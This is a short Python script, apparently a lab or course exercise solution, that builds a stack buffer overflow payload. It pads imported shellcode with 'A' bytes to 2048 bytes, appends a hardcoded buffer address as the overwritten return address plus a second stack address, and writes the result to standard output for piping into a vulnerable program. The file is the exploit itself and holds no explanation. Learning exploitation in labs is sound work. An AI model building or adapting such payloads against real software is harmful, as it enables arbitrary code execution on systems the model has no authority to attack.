#!/usr/bin/env python3

import sys
from shellcode import shellcode

#buf starting address
buf_address = 0x7ffffff6c970

#temp = 0x7ffffff6d150



payload = shellcode + b"A" * (2048 - len(shellcode)) +  buf_address.to_bytes(8, 'little') + (0x7ffffff6d188.to_bytes(8, 'little'))


# Write the payload to standard output
sys.stdout.buffer.write(payload)
